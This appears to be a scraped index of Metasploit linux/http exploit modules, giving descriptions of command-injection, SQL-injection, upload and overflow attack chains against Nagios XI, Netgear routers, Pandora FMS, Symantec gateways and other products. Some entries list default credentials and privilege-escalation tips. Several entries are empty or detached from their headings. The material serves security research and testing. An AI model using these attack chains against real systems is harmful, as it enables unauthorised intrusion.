This module exploits a SQL injection and command injection vulnerability in MicroFocus Secure Messaging Gateway. An unauthenticated user can execute a terminal command under the context of the web user. One of the user supplied parameters of API endpoint is used by the application without input validation and/or parameter binding, which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a ability to add new user onto system. manage_domains_dkim_keygen_request.php endpoint is responsible for executing an operation system command. It's not possible to access this endpoint without having a valid session. Combining these vulnerabilities gives the opportunity execute operation system commands under the context of the web user.

linux/http/mida_solutions_eframework_ajaxreq_rce
This module exploits a command injection vulnerability in Mida Solutions eFramework version 2.9.0 and prior. The `ajaxreq.php` file allows unauthenticated users to inject arbitrary commands in the `PARAM` parameter to be executed as the apache user. The sudo configuration permits the apache user to execute any command as root without providing a password, resulting in privileged command execution as root. This module has been successfully tested on Mida Solutions eFramework-C7-2.9.0 virtual appliance.

linux/http/mobileiron_core_log4shell
MobileIron Core is affected by the Log4Shell vulnerability whereby a JNDI string sent to the server will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the tomcat user. This module will start an LDAP server that the target will need to connect to.

linux/http/mobileiron_mdm_hessian_rce

linux/http/mutiny_frontend_upload
This module exploits a code execution flaw in the Mutiny 5 appliance. The EditDocument servlet provides a file upload function to authenticated users. A directory traversal vulnerability in the same functionality allows for arbitrary file upload, which results in arbitrary code execution with root privileges. In order to exploit the vulnerability a valid user (any role) in the web frontend is required. The module has been tested successfully on the Mutiny 5.0-1.07 appliance.

linux/http/mvpower_dvr_shell_exec
This module exploits an unauthenticated remote command execution vulnerability in MVPower digital video recorders. The 'shell' file on the web interface executes arbitrary operating system commands in the query string. This module was tested successfully on a MVPower model TV-7104HE with firmware version 1.8.4 115215B9 (Build 2014/11/17). The TV-7108HE model is also reportedly affected, but untested.

linux/http/nagios_xi_autodiscovery_webshell
This module exploits a path traversal issue in Nagios XI before version 5.8.5 (CVE-2021-37343). The path traversal allows a remote and authenticated administrator to upload a PHP web shell and execute code as `www-data`. The module achieves this by creating an autodiscovery job with an `id` field containing a path traversal to a writable and remotely accessible directory, and `custom_ports` field containing the web shell. A cron file will be created using the chosen path and file name, and the web shell is embedded in the file. After the web shell has been written to the victim, this module will then use the web shell to establish a Meterpreter session or a reverse shell. By default, the web shell is deleted by the module, and the autodiscovery job is removed as well.

linux/http/nagios_xi_chained_rce
This module exploits an SQL injection, auth bypass, file upload, command injection, and privilege escalation in Nagios XI <= 5.2.7 to pop a root shell.

linux/http/nagios_xi_chained_rce_2_electric_boogaloo
This module exploits a few different vulnerabilities in Nagios XI 5.2.6-5.4.12 to gain remote root access. The steps are: 1. Issue a POST request to /nagiosql/admin/settings.php which sets the database user to root. 2. SQLi on /nagiosql/admin/helpedit.php allows us to enumerate API keys. 3. The API keys are then used to add an administrative user. 4. An authenticated session is established with the newly added user 5. Command Injection on /nagiosxi/backend/index.php allows us to execute the payload with nopasswd sudo, giving us a root shell. 6. Remove the added admin user and reset the database user.

linux/http/nagios_xi_configwizards_authenticated_rce
This module exploits CVE-2021-25296, CVE-2021-25297, and CVE-2021-25298, which are OS command injection vulnerabilities in the windowswmi, switch, and cloud-vm configuration wizards that allow an authenticated user to perform remote code execution on Nagios XI versions 5.5.6 to 5.7.5 as the apache user. Valid credentials for a Nagios XI user are required. This module has been successfully tested against official NagiosXI OVAs from 5.5.6-5.7.5.

linux/http/nagios_xi_magpie_debug
This module exploits two vulnerabilities in Nagios XI <= 5.5.6: CVE-2018-15708 which allows for unauthenticated remote code execution and CVE-2018-15710 which allows for local privilege escalation. When combined, these two vulnerabilities allow execution of arbitrary commands as root.

linux/http/nagios_xi_mibs_authenticated_rce
This module exploits CVE-2020-5791, an OS command injection vulnerability in `admin/mibs.php` that enables an authenticated user with admin privileges to achieve remote code execution as either the `apache` user or the `www-data` user on NagiosXI version 5.6.0 to 5.7.3 inclusive (exact user depends on the version of NagiosXI installed as well as the OS its installed on). Valid credentials for a Nagios XI admin user are required. This module has been successfully tested against Nagios XI 5.7.3 running on CentOS 7.

linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
This module exploits a vulnerability in the getprofile.sh script of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping plugin and thereby execute arbitrary commands. For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user. For versions 5.5.0-5.6.5 the commands are run as root. Note that versions prior to 5.2.0 will still be marked as being vulnerable however this module does not presently support exploiting these targets. The module uploads a malicious check_ping plugin to the Nagios XI server via /admin/monitoringplugins.php and then executes this plugin by issuing a HTTP GET request to download a system profile from the server. For all supported targets except Linux (cmd), the module uses a command stager to write the exploit to the target via the malicious plugin. This may not work if Nagios XI is running in a restricted Unix environment, so in that case the target must be set to Linux (cmd). The module then writes the payload to the malicious plugin while avoiding commands that may not be supported. Valid credentials for a user with administrative privileges are required. This module was successfully tested on Nagios XI 5.3.0 and Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before 5.5.0, it may take a significant amount of time for the payload to get back (up to 5 minutes). If exploitation fails against an older system, it is recommended to increase the WfsDelay setting (default is 300 seconds). See the documentation for more information.

linux/http/nagios_xi_plugins_filename_authenticated_rce
This module exploits a command injection vulnerability (CVE-2020-35578) in the `/admin/monitoringplugins.php` page of Nagios XI versions prior to 5.8.0 when uploading plugins. Successful exploitation allows an authenticated admin user to achieve remote code execution as the `apache` user by uploading a malicious plugin. Valid credentials for a Nagios XI admin user are required. This module has been successfully tested against Nagios versions XI 5.3.0 and 5.7.5, both running on CentOS 7.

linux/http/nagios_xi_snmptrap_authenticated_rce
This module exploits an OS command injection vulnerability in includes/components/nxti/index.php that enables an authenticated user with admin privileges to achieve remote code execution as the `apache` user. The module uploads a simple PHP shell via includes/components/nxti/index.php to includes/components/autodiscovery/jobs/<php_shell> and then executes the payload as the `apache` user via an HTTP GET request to includes/components/autodiscovery/jobs/<php_shell>?<php_param>=<cmd> Valid credentials for a Nagios XI admin user are required. This module has been successfully tested against Nagios XI 5.7.3 running on CentOS 7.

linux/http/netgear_dgn1000_setup_unauth_exec
This module exploits an unauthenticated OS command execution vulneralbility in the setup.cgi file in Netgear DGN1000 firmware versions up to 1.1.00.48, and DGN2000v1 models.

linux/http/netgear_dgn1000b_setup_exec
Some Netgear Routers are vulnerable to authenticated OS Command injection. The vulnerability exists in the web interface, specifically in the setup.cgi component, when handling the TimeToLive parameter. Default credentials are always a good starting point, admin/admin or admin/password could be a first try. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes.

linux/http/netgear_dgn2200b_pppoe_exec
Some Netgear Routers are vulnerable to an authenticated OS command injection on their web interface. Default credentials for the web interface are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. This module overwrites parts of the PPOE configuration, while the module tries to restore it after exploitation configuration backup is recommended.

linux/http/netgear_dnslookup_cmd_exec

linux/http/netgear_readynas_exec
This module exploits a Perl code injection on NETGEAR ReadyNAS 4.2.23 and 4.1.11. The vulnerability exists on the web front end, specifically in the np_handler.pl component, due to an insecure usage of the eval() perl function. This module has been tested successfully on a NETGEAR ReadyNAS 4.2.23 Firmware emulated environment.

linux/http/netgear_unauth_exec
From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute arbitrary commands.

linux/http/netgear_wnr2000_rce
The NETGEAR WNR2000 router has a stack buffer overflow vulnerability in the hidden_lang_avi parameter. In order to exploit it, it is necessary to guess the value of a certain timestamp which is in the configuration of the router. An authenticated attacker can simply fetch this from a page, but an unauthenticated attacker has to brute force it. Brute forcing the timestamp token might take a few minutes, a few hours, or days, but it is guaranteed that it can be bruteforced. This module implements both modes, and it works very reliably. It has been tested with the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware revisions v4 and v3, but this has not been tested - with these routers it might be necessary to adjust the LibcBase variable as well as the gadget addresses.

linux/http/netsweeper_webadmin_unixlogin
This module exploits a Python code injection in the Netsweeper WebAdmin component's unixlogin.php script, for versions 6.4.4 and prior, to execute code as the root user. Authentication is bypassed by sending a random whitelisted Referer header in each request. Tested on the CentOS Linux-based Netsweeper 6.4.3 and 6.4.4 ISOs. Though the advisory lists 6.4.3 and prior as vulnerable, 6.4.4 has been confirmed exploitable.

linux/http/nexus_repo_manager_el_injection
This module exploits a Java Expression Language (EL) injection in Nexus Repository Manager versions up to and including 3.21.1 to execute code as the Nexus user. This is a post-authentication vulnerability, so credentials are required to exploit the bug. Any user regardless of privilege level may be used. Tested against 3.21.1-01.

linux/http/nginx_chunked_size
This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx. The exploit first triggers an integer overflow in the ngx_http_parse_chunked() by supplying an overly long hex value as chunked block size. This value is later used when determining the number of bytes to read into a stack buffer, thus the overflow becomes possible.

linux/http/nuuo_nvrmini_auth_rce
The NVRmini 2 Network Video Recorder, Crystal NVR and the ReadyNAS Surveillance application are vulnerable to an authenticated remote code execution on the exposed web administration interface. An administrative account is needed to exploit this vulnerability. This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS. This exploit has been tested on several versions of the NVRmini 2, Crystal and the ReadyNAS Surveillance. It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested in those devices.

linux/http/nuuo_nvrmini_unauth_rce
The NVRmini 2 Network Video Recorder and the ReadyNAS Surveillance application are vulnerable to an unauthenticated remote code execution on the exposed web administration interface. This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS. This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance. It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested in those devices.

linux/http/op5_config_exec
op5 an open source network monitoring software. The configuration page in version 7.1.9 and below allows the ability to test a system command, which can be abused to run arbitrary code as an unpriv user.

linux/http/openfiler_networkcard_exec
This module exploits a vulnerability in Openfiler v2.x which could be abused to allow authenticated users to execute arbitrary code under the context of the 'openfiler' user. The 'system.html' file uses user controlled data from the 'device' parameter to create a new 'NetworkCard' object. The class constructor in 'network.inc' calls exec() with the supplied data. The 'openfiler' user may 'sudo /bin/bash' without providing a system password.

linux/http/opentsdb_key_cmd_injection
This module exploits an unauthenticated command injection vulnerability in the key parameter in OpenTSDB through 2.4.1 (CVE-2023-36812/CVE-2023-25826) in order to achieve unauthenticated remote code execution as the root user. The module first attempts to obtain the OpenTSDB version via the api. If the version is 2.4.1 or lower, the module performs additional checks to obtain the configured metrics and aggregators. It then randomly selects one metric and one aggregator and uses those to instruct the target server to plot a graph. As part of this request, the key parameter is set to the payload, which will then be executed by the target if the latter is vulnerable. This module has been successfully tested against OpenTSDB version 2.4.1.

linux/http/opentsdb_yrange_cmd_injection
This module exploits an unauthenticated command injection vulnerability in the yrange parameter in OpenTSDB through 2.4.0 (CVE-2020-35476) in order to achieve unauthenticated remote code execution as the root user. The module first attempts to obtain the OpenTSDB version via the api. If the version is 2.4.0 or lower, the module performs additional checks to obtain the configured metrics and aggregators. It then randomly selects one metric and one aggregator and uses those to instruct the target server to plot a graph. As part of this request, the yrange parameter is set to the payload, which will then be executed by the target if the latter is vulnerable. This module has been successfully tested against OpenTSDB version 2.3.0.

linux/http/optergy_bms_backdoor_rce_cve_2019_7276
This module exploits an undocumented backdoor vulnerability in the Optergy Proton and Enterprise Building Management System (BMS) applications. Versions `2.0.3a` and below are vulnerable. Attackers can exploit this issue by directly navigating to an undocumented backdoor script called Console.jsp in the tools directory and gain full system access. Successful exploitation results in `root` command execution using `sudo` as user `optergy`.

linux/http/oracle_ebs_rce_cve_2022_21587
This module exploits an unauthenticated arbitrary file upload vulnerability in Oracle Web Applications Desktop Integrator, as shipped with Oracle EBS versions 12.2.3 through to 12.2.11, in order to gain remote code execution as the oracle user.

linux/http/pandora_fms_events_exec
This module exploits a vulnerability (CVE-2020-13851) in Pandora FMS versions 7.0 NG 742, 7.0 NG 743, and 7.0 NG 744 (and perhaps older versions) in order to execute arbitrary commands. This module takes advantage of a command injection vulnerability in the `Events` feature of Pandora FMS. This flaw allows users to execute arbitrary commands via the `target` parameter in HTTP POST requests to the `Events` function. After authenticating to the target, the module attempts to exploit this flaw by issuing such an HTTP POST request, with the `target` parameter set to contain the payload. If a shell is obtained, the module will try to obtain the local MySQL database password via a simple `grep` command on the plaintext `/var/www/html/pandora_console/include/config.php` file. Valid credentials for a Pandora FMS account are required. The account does not need to have admin privileges. This module has been successfully tested on Pandora 7.0 NG 744 running on CentOS 7 (the official virtual appliance ISO for this version).

linux/http/pandora_fms_exec
This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower. It will leverage an unauthenticated command injection in the Anyterm service on port 8023/TCP. Commands are executed as the user "pandora". In Pandora FMS 4.1 and 5.0RC1 the user "artica" is not assigned a password by default, which makes it possible to su to this user from the "pandora" user. The "artica" user has access to sudo without a password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0 and lower force a password for the "artica" user during installation.

linux/http/pandora_fms_sqli
This module attempts to exploit multiple issues in order to gain remote code execution under Pandora FMS version <= 5.0 SP2. First, an attempt to authenticate using default credentials is performed. If this method fails, a SQL injection vulnerability is leveraged in order to extract the "Auto Login" password hash. If this value is not set, the module will then extract the administrator account's MD5 password hash.

linux/http/pandora_ping_cmd_exec
This module exploits a vulnerability found in Pandora FMS 7.0NG and lower. net_tools.php in Pandora FMS 7.0NG allows remote attackers to execute arbitrary OS commands.

linux/http/panos_op_cmd_exec
An OS Command Injection vulnerability in the PAN-OS management interface that allows authenticated administrators to execute arbitrary OS commands with root privileges. This issue impacts PAN-OS versions < 10.0.1, < 9.1.4 and < 9.0.10

linux/http/panos_readsessionvars
This module exploits a chain of vulnerabilities in Palo Alto Networks products running PAN-OS versions prior to 6.1.19, 7.0.19, 7.1.14, and 8.0.6. This chain starts by using an authentication bypass flaw to to exploit an XML injection issue, which is then abused to create an arbitrary directory, and finally gains root code execution by exploiting a vulnerable cron script. This module uses an initial reverse TLS callback to stage arbitrary payloads on the target appliance. The cron job used for the final payload runs every 15 minutes by default and exploitation can take up to 20 minutes.

linux/http/peercast_url
This module exploits a stack buffer overflow in PeerCast <= v0.1216. The vulnerability is caused due to a boundary error within the handling of URL parameters.

linux/http/php_imap_open_rce
The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an IMAP session. On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary. Ssh's ProxyCommand option can be passed from imap_open to execute arbitrary commands. While many custom applications may use imap_open, this exploit works against the following applications: e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use. Prestashop exploitation requires the admin URI, and administrator credentials. suiteCRM/e107 require administrator credentials. Fixed in php 5.6.39.

linux/http/pineapp_ldapsyncnow_exec
This module exploits a command injection vulnerability on PineApp Mail-SeCure 3.70. The vulnerability exists on the ldapsyncnow.php component, due to the insecure usage of the shell_exec() php function. This module has been tested successfully on PineApp Mail-SeCure 3.70.

linux/http/pineapp_livelog_exec

linux/http/pineapp_test_li_conn_exec
This module exploits a command injection vulnerability on PineApp Mail-SeCure 3.70. The vulnerability exists on the test_li_connection.php component, due to the insecure usage of the system() php function. This module has been tested successfully on PineApp Mail-SeCure 3.70.

linux/http/pineapple_bypass_cmdinject
This module exploits a login/csrf check bypass vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4. These devices may typically be identified by their SSID beacons of 'Pineapple5_....'; Provided as part of the TospoVirus workshop at DEFCON23.

linux/http/pineapple_preconfig_cmdinject
This module exploits a command injection vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4. We use a combination of default credentials with a weakness in the anti-csrf generation to achieve command injection on fresh pineapple devices prior to configuration. Additionally if default credentials fail, you can enable a brute force solver for the proof-of-ownership challenge. This will reset the password to a known password if successful and may interrupt the user experience. These devices may typically be identified by their SSID beacons of 'Pineapple5_....'; details derived from the TospoVirus, a WiFi Pineapple infecting worm.

linux/http/piranha_passwd_exec
This module abuses two flaws - a metacharacter injection vulnerability in the HTTP management server of RedHat 6.2 systems running the Piranha LVS cluster service and GUI (rpm packages: piranha and piranha-gui). The vulnerability allows an authenticated attacker to execute arbitrary commands as the Apache user account (nobody) within the /piranha/secure/passwd.php3 script. The package installs with a default user and password of piranha:q which was exploited in the wild.

linux/http/pulse_secure_cmd_exec
This module exploits a post-auth command injection in the Pulse Secure VPN server to execute commands as root. The env(1) command is used to bypass application whitelisting and run arbitrary commands. Please see related module auxiliary/gather/pulse_secure_file_disclosure for a pre-auth file read that is able to obtain plaintext and hashed credentials, plus session IDs that may be used with this exploit. A valid administrator session ID is required in lieu of untested SSRF.

linux/http/pulse_secure_gzip_rce
The Pulse Connect Secure appliance before 9.1R9 suffers from an uncontrolled gzip extraction vulnerability which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root. Admin credentials are required for successful exploitation. Of note, MANY binaries are not in `$PATH`, but are located in `/home/bin/`.

linux/http/pyload_js2py_exec
pyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services, the primary of which is on port 8000 and can not be used by external hosts. A secondary "Click 'N' Load" service runs on port 9666 and can be used remotely without authentication.

linux/http/qnap_qcenter_change_passwd_exec
This module exploits a command injection vulnerability in the `change_passwd` API method within the web interface of QNAP Q'Center virtual appliance versions prior to 1.7.1083. The vulnerability allows the 'admin' privileged user account to execute arbitrary commands as the 'admin' operating system user. Valid credentials for the 'admin' user account are required, however, this module also exploits a separate password disclosure issue which allows any authenticated user to view the password set for the 'admin' user during first install. This module has been tested successfully on QNAP Q'Center appliance version 1.6.1075.

linux/http/raidsonic_nas_ib5220_exec_noauth
Different Raidsonic NAS devices are vulnerable to OS command injection via the web interface. The vulnerability exists in timeHandler.cgi, which is accessible without authentication. This module has been tested with the versions IB-NAS5220 and IB-NAS4220. Since this module is adding a new user and modifying the inetd daemon configuration, this module is set to ManualRanking and could cause target instability.

linux/http/railo_cfml_rfi
This module exploits a remote file include vulnerability in Railo, tested against version 4.2.1. First, a call using a vulnerable <cffile> line in thumbnail.cfm allows an attacker to download an arbitrary PNG file. By appending a .cfm, and taking advantage of a directory traversal, an attacker can append cold fusion markup to the PNG file, and have it interpreted by the server. This is used to stage and execute a fully-fledged payload.

linux/http/rancher_server
Utilizing Rancher Server, an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container. As the docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owed by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server. The Docker image should exist on the target system or be a valid image from hub.docker.com. Use `check` with verbose mode to get a list of exploitable Rancher Hosts managed by the target system.

linux/http/rconfig_ajaxarchivefiles_rce
This module exploits multiple vulnerabilities in rConfig version 3.9 in order to execute arbitrary commands. This module takes advantage of a command injection vulnerability in the `path` parameter of the ajax archive file functionality within the rConfig web interface in order to execute the payload. Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via SQLI. This module has been successfully tested on Rconfig 3.9.3 and 3.9.4. The steps are: 1. SQLi on /commands.inc.php allows us to add an administrative user. 2. An authenticated session is established with the newly added user 3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to execute the payload. 4. Remove the added admin user. Tips : once you get a shell, look at the CVE-2019-19585. You will probably get root because rConfig install script add Apache user to sudoers with nopasswd ;-)

linux/http/rconfig_vendors_auth_file_upload_rce
This module allows an attacker with a privileged rConfig account to start a reverse shell due to an arbitrary file upload vulnerability in `/lib/crud/vendors.crud.php`. Then, the uploaded payload can be triggered by a call to `images/vendor/<payload_file>.php`

linux/http/realtek_miniigd_upnp_exec_noauth
Different devices using the Realtek SDK with the miniigd daemon are vulnerable to OS command injection in the UPnP SOAP interface. Since it is a blind OS command injection vulnerability, there is no output for the executed command. This module has been tested successfully on a Trendnet TEW-731BR router with emulation.

linux/http/riverbed_netprofiler_netexpress_exec
This module exploits three separate vulnerabilities found in the Riverbed SteelCentral NetProfiler/NetExpress virtual appliances to obtain remote command execution as the root user. A SQL injection in the login form can be exploited to add a malicious user into the application's database. An attacker can then exploit a command injection vulnerability in the web interface to obtain arbitrary code execution. Finally, an insecure configuration of the sudoers file can be abused to escalate privileges to root.

linux/http/roxy_wi_exec
This module exploits an unauthenticated command injection vulnerability in Roxy-WI prior to version 6.1.1.0. Successful exploitation results in remote code execution under the context of the web server user. Roxy-WI is an interface for managing HAProxy, Nginx and Keepalived servers.

Tested against 2019.2.3 from Vulhub and 3002 on Ubuntu 20.04.1.

linux/http/saltstack_salt_wheel_async_rce
This module leverages an authentication bypass and directory traversal vulnerabilities in Saltstack Salt's REST API to execute commands remotely on the `master` as the root user. Every 60 seconds, `salt-master` service performs a maintenance process check that reloads and executes all the `grains` on the `master`, including custom grain modules in the Extension Module directory. So, this module simply creates a Python script at this location and waits for it to be executed. The time interval is set to 60 seconds by default but can be changed in the `master` configuration file with the `loop_interval` option. Note that, if an administrator executes commands locally on the `master`, the maintenance process check will also be performed. It has been fixed in the following installation packages: 3002.5, 3001.6 and 3000.8. Also, a patch is available for the following versions: 3002.2, 3001.4, 3000.6, 2019.2.8, 2019.2.5, 2018.3.5, 2017.7.8, 2016.11.10, 2016.11.6, 2016.11.5, 2016.11.3, 2016.3.8, 2016.3.6, 2016.3.4, 2015.8.13 and 2015.8.10. This module has been tested successfully against versions 3001.4, 3002 and 3002.2 on Ubuntu 18.04.

linux/http/samsung_srv_1670d_upload_exec
This module exploits an unrestricted file upload vulnerability in Web Viewer 1.0.0.193 on Samsung SRN-1670D devices. The network_ssl_upload.php file allows remote authenticated attackers to upload and execute arbitrary PHP code via a filename with a .php extension, which is then accessed via a direct request to the file in the upload/ directory. To authenticate for this attack, one can obtain web-interface credentials in cleartext by leveraging the existing local file read vulnerability referenced by CVE-2015-8279, which allows remote attackers to read the web interface credentials by sending a request to: cslog_export.php?path=/root/php_modules/lighttpd/sbin/userpw URI.

linux/http/seagate_nas_php_exec_noauth
Some Seagate Business NAS devices are vulnerable to command execution via a local file include vulnerability hidden in the language parameter of the CodeIgniter session cookie. The vulnerability manifests in the way the language files are included in the code on the login page, and hence is open to attack from users without the need for authentication. The cookie can be easily decrypted using a known static encryption key and re-encrypted once the PHP object string has been modified. This module has been tested on the STBN300 device.

linux/http/smt_ipmi_close_window_bof
This module exploits a buffer overflow on the Supermicro Onboard IPMI controller web interface. The vulnerability exists on the close_window.cgi CGI application, and is due to the insecure usage of strcpy.

linux/http/sophos_utm_webadmin_sid_cmd_injection
This module exploits an SID-based command injection in Sophos UTM's WebAdmin interface to execute shell commands as the root user.

linux/http/sophos_wpa_iface_exec
This module takes advantage of two vulnerabilities in order to gain remote code execution as root as an otherwise non-privileged authorized user. By taking advantage of a mass assignment vulnerability that allows an unprivileged authenticated user to change the administrator's password hash, the module updates the password to login as the admin to reach the second vulnerability. No server-side sanitization is done on values passed when configuring a static network interface. This allows an administrator user to run arbitrary commands in the context of the web application, which is root when configuring the network interface. This module will inadvertently delete any other users that may have been present as a side effect of changing the admin's password.

linux/http/sophos_wpa_sblistpack_exec

The vulnerability can be exploited when the Gateway Actuator endpoint is enabled, exposed and unsecured. An unauthenticated attacker can use SpEL expressions to execute code and take control of the victim machine.

linux/http/suitecrm_log_file_rce
This module exploits an input validation error on the log file extension parameter. It does not properly validate upper/lower case characters. Once this occurs, the application log file will be treated as a php file. The log file can then be populated with php code by changing the username of a valid user, as this info is logged. The php code in the file can then be executed by sending an HTTP request to the log file. A similar issue was reported by the same researcher where a blank file extension could be supplied and the extension could be provided in the file name. This exploit will work on those versions as well, and those references are included.

linux/http/supervisor_xmlrpc_exec
This module exploits a vulnerability in the Supervisor process control software, where an authenticated client can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server. The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.

linux/http/symantec_messaging_gateway_exec
This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a terminal command under the context of the web server user which is root. backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal command. Thus, you need to configure your own SSH service and set the required parameter during module usage. This module was tested against Symantec Messaging Gateway 10.6.2-7.

linux/http/symantec_web_gateway_exec
This module exploits a command injection vulnerability found in Symantec Web Gateway's HTTP service due to the insecure usage of the exec() function. This module abuses the spywall/ipchange.php file to execute arbitrary OS commands without authentication.

linux/http/symantec_web_gateway_lfi
This module exploits a vulnerability found in Symantec Web Gateway's HTTP service. By injecting PHP code in the access log, it is possible to load it with a directory traversal flaw, which allows remote code execution under the context of 'apache'. Please note that it may take up to several minutes to retrieve access_log, which is about the amount of time required to see a shell back.

linux/http/symantec_web_gateway_pbcontrol
This module exploits a command injection vulnerability found in Symantec Web Gateway's HTTP service. While handling the filename parameter, the Spywall API does not do any filtering before passing it to an exec() call in proxy_file(), thus results in remote code execution under the context of the web server. Please note authentication is NOT needed to gain access.

linux/http/symantec_web_gateway_restore
This module exploits a command injection vulnerability found in Symantec Web Gateway's setting restoration feature. The filename portion can be used to inject system commands into a syscall function, and gain control under the context of HTTP service.

linux/http/symmetricom_syncserver_rce
This module exploits an unauthenticated command injection vulnerability in /controller/ping.php. The S100 through S350 (End of Life) models should be vulnerable to unauthenticated exploitation due to a session handling vulnerability. Later models require authentication which is not provided in this module because we can't test it. The command injection vulnerability is patched in the S650 v2.2 (CVE-2022-40022). Run 'check' first to determine if vulnerable. The server limits outbound ports. Ports 25 and 80 TCP were successfully used for SRVPORT and LPORT while testing this module.

linux/http/synology_dsm_sliceupload_exec_noauth
This module exploits a vulnerability found in Synology DiskStation Manager (DSM) versions 4.x, which allows the execution of arbitrary commands under root privileges. The vulnerability is located in /webman/imageSelector.cgi, which allows to append arbitrary data to a given file using a so called SLICEUPLOAD functionality, which can be triggered by an unauthenticated user with a specially crafted HTTP request. This is exploited by this module to append the given commands to /redirect.cgi, which is a regular shell script file, and can be invoked with another HTTP request. Synology reported that the vulnerability has been fixed with versions 4.0-2259, 4.2-3243, and 4.3-3810 Update 1, respectively; the 4.1 branch remains vulnerable.

linux/http/synology_dsm_smart_exec_auth
This module exploits a vulnerability found in Synology DiskStation Manager (DSM) versions < 5.2-5967-5, which allows the execution of arbitrary commands under root privileges after website authentication. The vulnerability is located in webman/modules/StorageManager/smart.cgi, which allows appending of a command to the device to be scanned. However, the command with drive is limited to 30 characters. A somewhat valid drive name is required, thus /dev/sd is used, even though it doesn't exist. To circumvent the character restriction, a wget input file is staged in /a, and executed to download our payload to /b. From there the payload is executed. A wfsdelay is required to give time for the payload to download, and the execution of it to run.

linux/http/terramaster_unauth_rce_cve_2020_35665
This module exploits an unauthenticated remote code-execution vulnerability in TerraMaster TOS 4.2.06 and lower via shell metacharacters in the Event parameter at vulnerable endpoint `include/makecvs.php` during CSV creation.

linux/http/tp_link_ncxxx_bonjour_command_injection
TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230, NC250, NC260, NC450) are vulnerable to an authenticated command injection. In all devices except NC210, despite a check on the name length in swSystemSetProductAliasCheck, no other checks are in place in order to prevent shell metacharacters from being introduced. The system name would then be used in swBonjourStartHTTP as part of a shell command where arbitrary commands could be injected and executed as root. NC210 devices cannot be exploited directly via /setsysname.cgi due to proper input validation. NC210 devices are still vulnerable since swBonjourStartHTTP did not perform any validation when reading the alias name from the configuration file. The configuration file can be written, and code execution can be achieved by combining this issue with CVE-2020-12110.

linux/http/tp_link_sc2020n_authenticated_telnet_injection

An attacker can leverage this vulnerability to execute code in the context of root. But authentication is required to exploit this vulnerability. Another specific flaw exist within the proxy service, which listens on port 8080 by default. Unauthenticated users can exploit this vulnerability in order to communicate with internal services in the product. Last but not least a flaw exists within the Apache Solr application, which is installed within the product. When parsing the file parameter, the process does not properly validate a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to disclose information in the context of the IWSS user. Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the root user. Version perior to 6.5 SP2 Patch 4 (Build 1901) are affected.

linux/http/trueonline_billion_5200w_rce
TrueOnline is a major ISP in Thailand, and it distributes a customized version of the Billion 5200W-T router. This customized version has at least two command injection vulnerabilities, one authenticated and one unauthenticated, on different firmware versions. This module will attempt to exploit the unauthenticated injection first, and if that fails, it will attempt to exploit the authenticated injection. This module was tested in an emulated environment, as the author doesn't have access to the Thai router any more. Any feedback should be sent directly to the module's author, as well as to the Metasploit project. There are other language strings in the firmware, so it is likely that this firmware is not only distributed in Thailand. Other Billion 5200W-T in other countries might be vulnerable too.

linux/http/trueonline_p660hn_v1_rce

This module combines two vulnerabilities in order achieve remote code execution in the context of the `horizon` user. The first vulnerability CVE-2022-22956 is an authentication bypass in OAuth2TokenResourceController ACS which allows a remote, unauthenticated attacker to bypass the authentication mechanism and execute any operation. The second vulnerability CVE-2022-22957 is a JDBC injection RCE specifically in the DBConnectionCheckController class's dbCheck method which allows an attacker to deserialize arbitrary Java objects which can allow remote code execution.

linux/http/wanem_exec
This module exploits a command execution vulnerability in WAN Emulator version 2.3 which can be abused to allow unauthenticated users to execute arbitrary commands under the context of the 'www-data' user. The 'result.php' script calls shell_exec() with user controlled data from the 'pc' parameter. This module also exploits a command execution vulnerability to gain root privileges. The 'dosu' binary is suid 'root' and vulnerable to command execution in argument one.

